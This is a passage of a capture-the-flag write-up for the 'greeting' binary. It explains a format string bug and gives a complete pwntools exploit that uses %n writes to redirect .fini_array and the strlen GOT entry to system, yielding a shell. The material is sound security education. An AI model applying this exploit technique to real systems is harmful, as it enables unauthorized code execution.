+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>So we are dealing with a <code>32</code> bit binary, with a stack canary and non executable stack (but no RELRO or PIE). Let's see what happens when we run the binary:</p>
+<pre><code>./greeting
+Hello, I'm nao!
+Please tell me your name... guyinatuxedo
+Nice to meet you, guyinatuxedo :)
+</code></pre>
+<p>So we can see that we are prompted for input, which it prints back out to us. Let's take a look at the binary in Ghidra:</p>
+<pre><code>void main(void)
+
+{
+  int bytesRead;
+  int in_GS_OFFSET;
+  char printedString [64];
+  undefined name [64];
+  int stackCanary;
+ 
+  stackCanary = *(int *)(in_GS_OFFSET + 0x14);
+  printf(&quot;Please tell me your name... &quot;);
+  bytesRead = getnline(name,0x40);
+  if (bytesRead == 0) {
+    puts(&quot;Don\'t ignore me ;( &quot;);
+  }
+  else {
+    sprintf(printedString,&quot;Nice to meet you, %s :)\n&quot;,name);
+    printf(printedString);
+  }
+  if (stackCanary != *(int *)(in_GS_OFFSET + 0x14)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+</code></pre>
+<p>So we can see that in the <code>main</code> function, it runs the <code>getnline</code> function which scans in input and returns the amount of bytes read (I will cover that function next). It scans in data into the <code>name</code> char buffer. Proceeding that if <code>getnline</code> didn't scan in <code>0</code> bytes, it will write the string <code>&quot;Nice to meet you, &quot; + ourInput + &quot; :)\n&quot;</code> to <code>printedString</code>, then prints it using <code>printf</code>. Thing is since in the <code>printf</code> call it doesn't specify a format to print the input, this is a format string bug and we can specify how our input is printed. Using the <code>%n</code> flag with printf, we can actually write to memory. Since RELRO isn't enabled, we can write to the GOT table (the GOT Table is a table of addresses in the binary that hold libc address functions), and since PIE isn't enabled we know the addresses of the GOT table.</p>
+<p>Looking at the <code>getnline</code> function, we see this:</p>
+<pre><code>void getnline(char *ptr,int bytesRead)
+
+{
+  char *pcVar1;
+ 
+  fgets(ptr,bytesRead,stdin);
+  pcVar1 = strchr(ptr,10);
+  if (pcVar1 != (char *)0x0) {
+    *pcVar1 = '\0';
+  }
+  strlen(ptr);
+  return;
+}
+</code></pre>
+<p>It just scans in <code>bytesRead</code> amount of data (in our case <code>0x40</code> or <code>60</code> so no overflow) into the space pointed to by <code>ptr</code>. Proceeding that, it will replace the newline character with a null byte. It will then return the output of <code>strlen</code> on our input.</p>
+<p>Now the next thing we need will be a function to overwrite a got entry with. Looking through the list of imports in ghidra (imported functions are included in the compiled binary code, and since pie isn't enabled we know the addresses of those functions) we can see that <code>system</code> is imported, and is at the address <code>0x8048490</code> in the plt table:</p>
+<pre><code>                             **************************************************************
+                             *                       THUNK FUNCTION                       *
+                             **************************************************************
+                             thunk int system(char * __command)
+                               Thunked-Function: &lt;EXTERNAL&gt;::system
+             int               EAX:4          &lt;RETURN&gt;
+             char *            Stack[0x4]:4   __command
+                             system@@GLIBC_2.0
+                             system                                          XREF[2]:     system:08048490(T),
+                                                                                          system:08048490(c), 08049a48(*)  
+        0804a014                 ??         ??
+
+</code></pre>
+<p>We can also find the address using <code>objdump</code>:</p>
+<pre><code>$    objdump -D greeting | grep system
+08048490 &lt;system@plt&gt;:
+ 8048779:    e8 12 fd ff ff           call   8048490 &lt;system@plt&gt;
+</code></pre>
+<p>So we will overwrite a got entry of a function with <code>system</code> to call it. The question is now which function to overwrite? Now we run into a different problem. The only function called after the <code>printf</code> call which gives us a format string write, is <code>__stack_chk_fail()</code> which will only get called if we execute a buffer overflow which we really can't do right now. We will overcome this by writing to the <code>.fini_array</code>, which contains an array of functions which are executed sometime after main returns. We will just write to it the address which starts the setup for the <code>getnline</code> function, to essentially wrap back around. We can find the <code>.fini_array</code> using gdb while running the program:</p>
+<pre><code>gef➤  info file
+Symbols from &quot;/Hackery/all/tw16/greeting&quot;.
+Native process:
+    Using the running image of child process 18898.
+    While running this, GDB does not access memory from...
+Local exec file:
+    `/Hackery/all/tw16/greeting', file type elf32-i386.
+    Entry point: 0x80484f0
+    0x08048134 - 0x08048147 is .interp
+    0x08048148 - 0x08048168 is .note.ABI-tag
+    0x08048168 - 0x0804818c is .note.gnu.build-id
+    0x0804818c - 0x080481b8 is .gnu.hash
+    0x080481b8 - 0x080482a8 is .dynsym
+    0x080482a8 - 0x08048344 is .dynstr
+    0x08048344 - 0x08048362 is .gnu.version
+    0x08048364 - 0x08048394 is .gnu.version_r
+    0x08048394 - 0x080483ac is .rel.dyn
+    0x080483ac - 0x08048404 is .rel.plt
+    0x08048404 - 0x08048427 is .init
+    0x08048430 - 0x080484f0 is .plt
+    0x080484f0 - 0x08048742 is .text
+    0x08048742 - 0x08048780 is tomori
+    0x08048780 - 0x08048794 is .fini
+    0x08048794 - 0x080487fd is .rodata
+    0x08048800 - 0x0804883c is .eh_frame_hdr
+    0x0804883c - 0x0804892c is .eh_frame
+    0x0804992c - 0x08049934 is .init_array
+    0x08049934 - 0x08049938 is .fini_array
+    0x08049938 - 0x0804993c is .jcr
+    0x0804993c - 0x08049a24 is .dynamic
+    0x08049a24 - 0x08049a28 is .got
+    0x08049a28 - 0x08049a60 is .got.plt
+    0x08049a60 - 0x08049a68 is .data
+    0x08049a80 - 0x08049aa8 is .bss
+    0xf7fd6114 - 0xf7fd6138 is .note.gnu.build-id in /lib/ld-linux.so.2
+    0xf7fd6138 - 0xf7fd6214 is .hash in /lib/ld-linux.so.2
+    0xf7fd6214 - 0xf7fd6314 is .gnu.hash in /lib/ld-linux.so.2
+    0xf7fd6314 - 0xf7fd6554 is .dynsym in /lib/ld-linux.so.2
+    0xf7fd6554 - 0xf7fd677a is .dynstr in /lib/ld-linux.so.2
+    0xf7fd677a - 0xf7fd67c2 is .gnu.version in /lib/ld-linux.so.2
+    0xf7fd67c4 - 0xf7fd688c is .gnu.version_d in /lib/ld-linux.so.2
+    0xf7fd688c - 0xf7fd69dc is .rel.dyn in /lib/ld-linux.so.2
+    0xf7fd69dc - 0xf7fd6a14 is .rel.plt in /lib/ld-linux.so.2
+    0xf7fd6a20 - 0xf7fd6aa0 is .plt in /lib/ld-linux.so.2
+    0xf7fd6aa0 - 0xf7fd6aa8 is .plt.got in /lib/ld-linux.so.2
+    0xf7fd6ab0 - 0xf7ff17fb is .text in /lib/ld-linux.so.2
+    0xf7ff1800 - 0xf7ff60a0 is .rodata in /lib/ld-linux.so.2
+    0xf7ff60a0 - 0xf7ff60a1 is .stapsdt.base in /lib/ld-linux.so.2
+    0xf7ff60a4 - 0xf7ff67d8 is .eh_frame_hdr in /lib/ld-linux.so.2
+    0xf7ff67d8 - 0xf7ffb37c is .eh_frame in /lib/ld-linux.so.2
+    0xf7ffc880 - 0xf7ffcf34 is .data.rel.ro in /lib/ld-linux.so.2
+    0xf7ffcf34 - 0xf7ffcfec is .dynamic in /lib/ld-linux.so.2
+    0xf7ffcfec - 0xf7ffcff4 is .got in /lib/ld-linux.so.2
+    0xf7ffd000 - 0xf7ffd028 is .got.plt in /lib/ld-linux.so.2
+    0xf7ffd040 - 0xf7ffd874 is .data in /lib/ld-linux.so.2
+    0xf7ffd878 - 0xf7ffd938 is .bss in /lib/ld-linux.so.2
+    0xf7fd40b4 - 0xf7fd40ec is .hash in system-supplied DSO at 0xf7fd4000
+    0xf7fd40ec - 0xf7fd4130 is .gnu.hash in system-supplied DSO at 0xf7fd4000
+    0xf7fd4130 - 0xf7fd41c0 is .dynsym in system-supplied DSO at 0xf7fd4000
+    0xf7fd41c0 - 0xf7fd4255 is .dynstr in system-supplied DSO at 0xf7fd4000
+    0xf7fd4256 - 0xf7fd4268 is .gnu.version in system-supplied DSO at 0xf7fd4000
+    0xf7fd4268 - 0xf7fd42bc is .gnu.version_d in system-supplied DSO at 0xf7fd4000
+    0xf7fd42bc - 0xf7fd434c is .dynamic in system-supplied DSO at 0xf7fd4000
+    0xf7fd434c - 0xf7fd4560 is .rodata in system-supplied DSO at 0xf7fd4000
+    0xf7fd4560 - 0xf7fd45c0 is .note in system-supplied DSO at 0xf7fd4000
+    0xf7fd45c0 - 0xf7fd45e4 is .eh_frame_hdr in system-supplied DSO at 0xf7fd4000
+    0xf7fd45e4 - 0xf7fd46f0 is .eh_frame in system-supplied DSO at 0xf7fd4000
+    0xf7fd46f0 - 0xf7fd5088 is .text in system-supplied DSO at 0xf7fd4000
+    0xf7fd5088 - 0xf7fd5124 is .altinstructions in system-supplied DSO at 0xf7fd4000
+    0xf7fd5124 - 0xf7fd514a is .altinstr_replacement in system-supplied DSO at 0xf7fd4000
+    0xf7dd7174 - 0xf7dd7198 is .note.gnu.build-id in /lib/i386-linux-gnu/libc.so.6
+    0xf7dd7198 - 0xf7dd71b8 is .note.ABI-tag in /lib/i386-linux-gnu/libc.so.6
+    0xf7dd71b8 - 0xf7ddb078 is .gnu.hash in /lib/i386-linux-gnu/libc.so.6
+    0xf7ddb078 - 0xf7de4cc8 is .dynsym in /lib/i386-linux-gnu/libc.so.6
+    0xf7de4cc8 - 0xf7deafc6 is .dynstr in /lib/i386-linux-gnu/libc.so.6
+    0xf7deafc6 - 0xf7dec350 is .gnu.version in /lib/i386-linux-gnu/libc.so.6
+    0xf7dec350 - 0xf7dec8b4 is .gnu.version_d in /lib/i386-linux-gnu/libc.so.6
+    0xf7dec8b4 - 0xf7dec8f4 is .gnu.version_r in /lib/i386-linux-gnu/libc.so.6
+    0xf7dec8f4 - 0xf7def4e4 is .rel.dyn in /lib/i386-linux-gnu/libc.so.6
+    0xf7def4e4 - 0xf7def53c is .rel.plt in /lib/i386-linux-gnu/libc.so.6
+    0xf7def540 - 0xf7def600 is .plt in /lib/i386-linux-gnu/libc.so.6
+    0xf7def600 - 0xf7def610 is .plt.got in /lib/i386-linux-gnu/libc.so.6
+    0xf7def610 - 0xf7f3c386 is .text in /lib/i386-linux-gnu/libc.so.6
+    0xf7f3c390 - 0xf7f3d41b is __libc_freeres_fn in /lib/i386-linux-gnu/libc.so.6
+    0xf7f3d420 - 0xf7f3d729 is __libc_thread_freeres_fn in /lib/i386-linux-gnu/libc.so.6
+    0xf7f3d740 - 0xf7f5e848 is .rodata in /lib/i386-linux-gnu/libc.so.6
+    0xf7f5e848 - 0xf7f5e849 is .stapsdt.base in /lib/i386-linux-gnu/libc.so.6
+    0xf7f5e84c - 0xf7f5e85f is .interp in /lib/i386-linux-gnu/libc.so.6
+    0xf7f5e860 - 0xf7f64dbc is .eh_frame_hdr in /lib/i386-linux-gnu/libc.so.6
+    0xf7f64dbc - 0xf7fa7874 is .eh_frame in /lib/i386-linux-gnu/libc.so.6
+    0xf7fa7874 - 0xf7fa7cf7 is .gcc_except_table in /lib/i386-linux-gnu/libc.so.6
+    0xf7fa7cf8 - 0xf7fab410 is .hash in /lib/i386-linux-gnu/libc.so.6
+    0xf7fad15c - 0xf7fad164 is .tdata in /lib/i386-linux-gnu/libc.so.6
+    0xf7fad164 - 0xf7fad1b0 is .tbss in /lib/i386-linux-gnu/libc.so.6
+    0xf7fad164 - 0xf7fad16c is .init_array in /lib/i386-linux-gnu/libc.so.6
+    0xf7fad16c - 0xf7fad1ec is __libc_subfreeres in /lib/i386-linux-gnu/libc.so.6
+    0xf7fad1ec - 0xf7fad1f0 is __libc_atexit in /lib/i386-linux-gnu/libc.so.6
+    0xf7fad1f0 - 0xf7fad200 is __libc_thread_subfreeres in /lib/i386-linux-gnu/libc.so.6
+    0xf7fad200 - 0xf7fad9d4 is __libc_IO_vtables in /lib/i386-linux-gnu/libc.so.6
+    0xf7fad9e0 - 0xf7faed6c is .data.rel.ro in /lib/i386-linux-gnu/libc.so.6
+    0xf7faed6c - 0xf7faee5c is .dynamic in /lib/i386-linux-gnu/libc.so.6
+    0xf7faee5c - 0xf7faefe4 is .got in /lib/i386-linux-gnu/libc.so.6
+    0xf7faf000 - 0xf7faf038 is .got.plt in /lib/i386-linux-gnu/libc.so.6
+    0xf7faf040 - 0xf7fafef4 is .data in /lib/i386-linux-gnu/libc.so.6
+    0xf7faff00 - 0xf7fb2a1c is .bss in /lib/i386-linux-gnu/libc.so.6
+</code></pre>
+<p>Through all of that we can see that the <code>.fini_array</code> is at <code>0x8049934</code>:</p>
+<pre><code>    0x08049934 - 0x08049938 is .fini_array
+</code></pre>
+<p>For the address we will loop back to, I choose <code>0x8048614</code>. This is the start of the setup for the <code>getnline</code> function call, and through trial and error we can see that it doesn't crash when we loop back here:</p>
+<pre><code>        0804860f e8 3c fe        CALL       printf                                           int printf(char * __format, ...)
+                 ff ff
+        08048614 c7 44 24        MOV        dword ptr [ESP + local_ac],0x40
+                 04 40 00
+                 00 00
+        0804861c 8d 44 24 5c     LEA        EAX=&gt;name,[ESP + 0x5c]
+        08048620 89 04 24        MOV        dword ptr [ESP]=&gt;local_b0,EAX
+        08048623 e8 51 00        CALL       getnline                                         undefined getnline(undefined4 pa
+                 00 00
+</code></pre>
+<p>Now brings up the question of which function's got address will we overwrite. Since the function system takes a single argument (a char pointer), ideally it would be a function that takes a single argument that is a char pointer to our input. I decided to go with the <code>strlen</code>, since in <code>getnline</code> it is called with a char pointer to our input. In addition to that, it isn't called somewhere else that would cause a crash with what we are doing. In Ghidra looking at the <code>.got.plt</code> memory region, we can see that the <code>got</code> entry is at <code>0x8049a54</code>:</p>
+<pre><code>                             PTR_strlen_08049a54                             XREF[1]:     strlen:080484c0  
+        08049a54 20 a0 04 08     addr       strlen                                           = ??
+</code></pre>
+<p>We can also find it using <code>objdump</code>:</p>
+<pre><code>$    objdump -R greeting | grep system
+08049a48 R_386_JUMP_SLOT   system@GLIBC_2.0
+</code></pre>
+<p>So now the last part I need to cover is actually exploiting the format string bug. I did this by hand, and it tends to get a bit grindy. The first thing we need to do is find our input in reference to the <code>printf</code> call, which we can do using the <code>%x</code> flag:</p>
+<pre><code>./greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c
+Hello, I'm nao!
+Please tell me your name... 0000111122223333.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+Nice to meet you, 0000111122223333.80487d0.ff8c4e3c.0.0.0.0.6563694e.206f7420.7465656d.756f7920.3030202c.31313030.32323131.33333232.252e3333.% :)
+</code></pre>
+<p>So we can see our input popping up <code>3030202c.31313030.32323131.33333232</code> (<code>1</code> = <code>0x31</code>, <code>2</code> = <code>0x32</code>, <code>0</code>=<code>0x30</code>). Through a bit of shifting around values, we can find that the format string <code>xx0000111122223333</code> gives us what we need.</p>
+<pre><code>./greeting
+Hello, I'm nao!
+Please tell me your name... xx0000111122223333.%12$x.%13$x.%14$x.%15$x
+Nice to meet you, xx0000111122223333.30303030.31313131.32323232.33333333 :)
+</code></pre>
+<p>Now when printf writes a value, it will write the amount of bytes it has printed. So if we need to write the value <code>0x804</code>, we need to print that many bytes. Since we are writing values like <code>0x8048614</code> I choose to split it up, that way we don't need to wait several minutes for the printf call to finish. I split up each write into two seperate writes, and that is why we needed four four byte spaces, each one for a different address. For the split writes, we will first write to the lower two bytes of each address. Since the top two bytes for each of the values we are writing is the same (<code>0x804</code>) I choose to write those last.</p>
+<p>Now when I ran the exploit below hand, these are the values that are written by default. At this point I know everything I need to write the exploit, except the extra number of bytes I need to print to write the correct values (to print <code>13</code> bytes we can just specify the format string <code>%13x</code>):</p>
+<pre><code>gef➤  x/x 0x8049934
+0x8049934:    0x00240024
+gef➤  x/x 0x8049a54
+0x8049a54 &lt;strlen@got.plt&gt;:    0x00240024
+</code></pre>
+<p>The first write I do is the the lower two bytes of the <code>.fini_array</code> address <code>0x8049934</code>. I need it to be the value <code>0x8614</code>, and it's value right now is <code>0x24</code>. So we just need to print an additional <code>0x8614 - 0x24 = 34288</code> bytes to get it to that value. Also the bytes printed before will affect future writes, so I just went through and did this for each individual write (except for the last two, since they were the same write I only needed to have one additional bytes printing for it). Subsequent writes can only be greater or equal to, not lesser.</p>
+<p>When we try to write the higher two bytes, we run into a bit of an issue:</p>
+<pre><code>gef➤  x/x 0x8049934
+0x8049934:    0x84908614
+gef➤  x/x 0x8049a54
+0x8049a54 &lt;strlen@got.plt&gt;:    0x84908490
+</code></pre>
+<p>The value it is writing to the higher two bytes is <code>0x8490</code>, however the value we need to write is smaller than that <code>0x0804</code>. So what we can do is write a larger value to it that contains the value <code>0x0804</code>, however the higher portion of that number will end up outside of the area we are writing to it. In order to do this, we will need to print <code>33652</code> bytes:</p>
+<pre><code>&gt;&gt;&gt; (0x10000 - 0x8490) + 0x804
+33652
+</code></pre>
+<p>we can see that the value were writing overflows into other subsequent dwords, however it doesn't really affect us:</p>
+<pre><code>gef➤  x/2x 0x8049934
+0x8049934:    0x08048614    0x00000002
+gef➤  x/2x 0x8049a54
+0x8049a54 &lt;strlen@got.plt&gt;:    0x08048490    0xf7d40002
+</code></pre>
+<p>With all of that, we can put it together and we get this exploit:</p>
+<pre><code>from pwn import *
+
+# Establish the target process
+target = process('greeting')
+gdb.attach(target, gdbscript = 'b *0x0804864f')
+
+# The values we will be overwritting
+finiArray = 0x08049934
+strlenGot = 0x08049a54
+
+# The values we will be overwritting with
+getline = 0x8048614
+systemPlt = 0x8048490
+
+# Establish the format string
+payload = &quot;&quot;
+
+# Just a bit of padding
+payload += &quot;xx&quot;
+
+# Address of fini array
+payload += p32(finiArray)
+
+# Address of fini array + 2
+payload += p32(finiArray + 2)
+
+# Address of got entry for strlen
+payload += p32(strlenGot)
+
+# Address of got entry for strlen + 2
+payload += p32(strlenGot + 2)
+
+# Write the lower two bytes of the fini array with loop around address (getline setup)
+payload += &quot;%34288x&quot;
+payload += &quot;%12$n&quot;
+
+# Write the lower two bytes of the plt system address to the got strlen entry
+payload += &quot;%65148x&quot;
+payload += &quot;%14$n&quot;
+
+# Write the higher two bytes of the two address we just wrote to
+# Both are the same (0x804)
+payload += &quot;%33652x&quot;
+payload += &quot;%13$n&quot;
+payload += &quot;%15$n&quot;
+
+# Print the length of our fmt string (make sure we meet the size requirement)
+print &quot;len: &quot; + str(len(payload))
+
+# Send the format string
+target.sendline(payload)
+
+# Send '/bin/sh' to trigger the system('/bin/sh') call
+target.sendline('/bin/sh')
+
+# Drop to an interactive shell
+target.interactive()
+</code></pre>
+<p>With that exploit, we get shell!</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        
+                            <a rel="prev" href="../../10-fmt_strings/pico18_echo/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                        
+
+                        
+                            <a rel="next" href="../../indexing.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                
+                    <a rel="prev" href="../../10-fmt_strings/pico18_echo/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a rel="next" href="../../indexing.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+            </nav>
+
+        </div>
+
+        
+
+        
+
+        
+
+        
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        
+
+        
+
+        
+        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        
+
+        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        
+
+        
+
+    </body>
+</html>
